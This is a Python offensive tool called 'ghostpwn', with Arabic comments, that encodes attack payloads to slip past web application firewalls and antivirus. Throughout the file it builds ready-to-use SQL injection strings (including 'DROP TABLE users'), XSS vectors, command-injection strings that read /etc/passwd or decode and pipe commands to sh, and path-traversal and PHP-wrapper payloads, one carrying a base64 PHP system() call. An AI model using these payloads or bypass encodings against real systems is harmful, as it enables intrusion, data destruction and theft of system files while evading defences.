#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Payload Encoder Module
تشفير payloads لتخطي WAF/AV
"""
import sys
import os
import base64
import urllib.parse
import binascii
from typing import Dict, List, Optional


class PayloadEncoder:
    """تشفير payloads لتخطي WAF/AV"""

    def __init__(self):
        self.encoders = {
            "url": self.url_encode,
            "double_url": self.double_url_encode,
            "hex": self.hex_encode,
            "base64": self.base64_encode,
            "unicode": self.unicode_encode,
            "html_entity": self.html_entity_encode,
            "decimal": self.decimal_encode,
            "octal": self.octal_encode,
            "mixed_case": self.mixed_case_encode,
            "comment_bypass": self.comment_bypass_encode,
            "concat": self.concat_encode,
        }

    # ============================ Encoders ============================
    def url_encode(self, payload: str) -> str:
        """URL encoding"""
        return urllib.parse.quote(payload, safe="")

    def double_url_encode(self, payload: str) -> str:
        """Double URL encoding"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")

    def hex_encode(self, payload: str) -> str:
        """Hex encoding"""
        return "0x" + payload.encode().hex()

    def base64_encode(self, payload: str) -> str:
        """Base64 encoding"""
        return base64.b64encode(payload.encode()).decode()

    def unicode_encode(self, payload: str) -> str:
        """Unicode encoding"""
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    def html_entity_encode(self, payload: str) -> str:
        """HTML entity encoding"""
        return "".join(f"&#{ord(c)};" for c in payload)

    def decimal_encode(self, payload: str) -> str:
        """Decimal encoding"""
        return "CHAR(" + ",".join(str(ord(c)) for c in payload) + ")"

    def octal_encode(self, payload: str) -> str:
        """Octal encoding"""
        return "\\" + "\\".join(f"{ord(c):o}" for c in payload)

    def mixed_case_encode(self, payload: str) -> str:
        """Mixed case (لـ SQL keywords)"""
        result = ""
        for i, c in enumerate(payload):
            if c.isalpha():
                if i % 2 == 0:
                    result += c.upper()
                else:
                    result += c.lower()
            else:
                result += c
        return result

    def comment_bypass_encode(self, payload: str) -> str:
        """إضافة comments لتخطي WAF"""
        # SQL comments
        sql_keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
        result = payload
        for kw in sql_keywords:
            result = result.replace(kw, f"{kw[:2]}/**/{kw[2:]}")
            result = result.replace(kw.lower(), f"{kw[:2].lower()}/**/{kw[2:].lower()}")
        return result

    def concat_encode(self, payload: str) -> str:
        """Concat bypass (لـ SQL)"""
        # استبدال ' بـ CONCAT
        if "'" in payload:
            parts = payload.split("'")
            if len(parts) >= 3:
                # بناء CONCAT statement
                concat_parts = []
                for i, part in enumerate(parts):
                    if part:
                        concat_parts.append(f"CHAR({','.join(str(ord(c)) for c in part)})")
                return "CONCAT(" + ",".join(concat_parts) + ")"
        return payload

    # ============================ SQLi Payloads ============================
    def generate_sqli_payloads(self, original: str = "1") -> List[Dict]:
        """توليد payloads مشفرة لـ SQLi"""
        base_payloads = [
            f"' OR '1'='1",
            f"' OR '1'='1' -- -",
            f"' OR '1'='1' #",
            f"' UNION SELECT NULL-- -",
            f"' UNION SELECT NULL,NULL-- -",
            f"1' AND SLEEP(5)-- -",
            f"'; DROP TABLE users-- -",
        ]

        all_payloads = []
        for payload in base_payloads:
            for enc_name, enc_func in self.encoders.items():
                try:
                    encoded = enc_func(payload)
                    all_payloads.append({
                        "original": payload,
                        "encoder": enc_name,
                        "encoded": encoded,
                        "type": "sqli",
                    })
                except Exception:
                    continue

        return all_payloads

    # ============================ XSS Payloads ============================
    def generate_xss_payloads(self) -> List[Dict]:
        """توليد payloads مشفرة لـ XSS"""
        base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<scr<script>ipt>alert(1)</script>",
        ]

        all_payloads = []
        for payload in base_payloads:
            for enc_name, enc_func in self.encoders.items():
                try:
                    encoded = enc_func(payload)
                    all_payloads.append({
                        "original": payload,
                        "encoder": enc_name,
                        "encoded": encoded,
                        "type": "xss",
                    })
                except Exception:
                    continue

        return all_payloads

    # ============================ Command Injection Payloads ============================
    def generate_cmd_payloads(self, cmd: str = "id") -> List[Dict]:
        """توليد payloads مشفرة لـ Command Injection"""
        base_payloads = [
            f";{cmd}",
            f"|{cmd}",
            f"&{cmd}",
            f"&&{cmd}",
            f"$({cmd})",
            f"`{cmd}`",
            f";{cmd} #",
            f"%3B{cmd}",
            f"%7C{cmd}",
        ]

        all_payloads = []
        for payload in base_payloads:
            for enc_name, enc_func in self.encoders.items():
                try:
                    encoded = enc_func(payload)
                    all_payloads.append({
                        "original": payload,
                        "encoder": enc_name,
                        "encoded": encoded,
                        "type": "cmd_injection",
                    })
                except Exception:
                    continue

        return all_payloads

    # ============================ WAF Bypass Payloads ============================
    def generate_waf_bypass_payloads(self) -> Dict:
        """توليد payloads مخصصة لتخطي WAF"""
        return {
            "sqli_waf_bypass": [
                # Case variation
                "' Or '1'='1",
                "' oR '1'='1",
                "' OR '1'='1",
                # Comment insertion
                "'/**/OR/**/'1'='1",
                "' OR/**/'1'='1",
                # Whitespace variations
                "'\tOR\t'1'='1",
                "'\nOR\n'1'='1",
                "'\rOR\r'1'='1",
                # URL encoding variations
                "'%20OR%20'1'='1",
                "'+OR+'1'='1",
                # Double encoding
                "'%2520OR%2520'1'='1",
                # Unicode
                "'\u0020OR\u0020'1'='1",
                # Concat
                "CONCAT('1','1')='1",
                # Char()
                "CHAR(49)=CHAR(49)",
            ],
            "xss_waf_bypass": [
                # Mixed case
                "<ScRiPt>alert(1)</ScRiPt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                # Whitespace
                "< script>alert(1)< /script>",
                "<script\x00>alert(1)</script>",
                # Encoding
                "<script>eval(atob('YWxlcnQoMSk='))</script>",
                # Nested
                "<scr<script>ipt>alert(1)</script>",
                "<img src=x:onerror=alert(1)>",
                # Event handlers
                "<svg/onload=alert(1)>",
                "<body/onload=alert(1)>",
                "<input/onfocus=alert(1) autofocus>",
                # Data URI
                "<object data='data:text/html,<script>alert(1)</script>'>",
            ],
            "cmd_waf_bypass": [
                # Wildcards
                ";/bin/c?t /etc/p?sswd",
                ";/???/?? /etc/p?sswd",
                # Variables
                ";a=id;$a",
                ";a=l;b=s;$a$b",
                # Backticks
                "`id`",
                # $()
                "$(id)",
                # Base64
                ";echo aWQ=|base64 -d|sh",
                # Hex
                ";echo 6964 | xxd -r -p | sh",
                # Variables with brackets
                ";${IFS}id",
                ";$IFS id",
            ],
            "lfi_waf_bypass": [
                # Double encoding
                "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                # Unicode
                "..%c0%af..%c0%afetc/passwd",
                # Null byte
                "../../../etc/passwd%00",
                # Filter bypass
                "....//....//....//etc/passwd",
                "..../....//....//etc/passwd",
                # PHP filters
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
                # Data wrapper
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
                # Input wrapper
                "php://input",
            ],
        }


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Payload Encoder")
    parser.add_argument("--type", choices=["sqli", "xss", "cmd", "waf"],
                       default="sqli")
    parser.add_argument("--cmd", default="id", help="Command for cmd payloads")
    parser.add_argument("--encoder", help="Specific encoder to use")
    parser.add_argument("--payload", help="Custom payload to encode")
    args = parser.parse_args()

    encoder = PayloadEncoder()

    if args.payload:
        if args.encoder:
            encoded = encoder.encoders[args.encoder](args.payload)
            print(f"Original: {args.payload}")
            print(f"Encoder: {args.encoder}")
            print(f"Encoded: {encoded}")
        else:
            print(f"Original: {args.payload}")
            for name, func in encoder.encoders.items():
                try:
                    encoded = func(args.payload)
                    print(f"  {name:20s}: {encoded}")
                except Exception as e:
                    print(f"  {name:20s}: ERROR: {e}")
    elif args.type == "sqli":
        payloads = encoder.generate_sqli_payloads()
        print(f"\n[+] Generated {len(payloads)} SQLi payloads")
        for p in payloads[:10]:
            print(f"  [{p['encoder']:15s}] {p['encoded']}")
    elif args.type == "xss":
        payloads = encoder.generate_xss_payloads()
        print(f"\n[+] Generated {len(payloads)} XSS payloads")
        for p in payloads[:10]:
            print(f"  [{p['encoder']:15s}] {p['encoded']}")
    elif args.type == "cmd":
        payloads = encoder.generate_cmd_payloads(args.cmd)
        print(f"\n[+] Generated {len(payloads)} CMD payloads")
        for p in payloads[:10]:
            print(f"  [{p['encoder']:15s}] {p['encoded']}")
    elif args.type == "waf":
        waf_payloads = encoder.generate_waf_bypass_payloads()
        for category, payloads in waf_payloads.items():
            print(f"\n[{category}]")
            for p in payloads:
                print(f"  {p}")
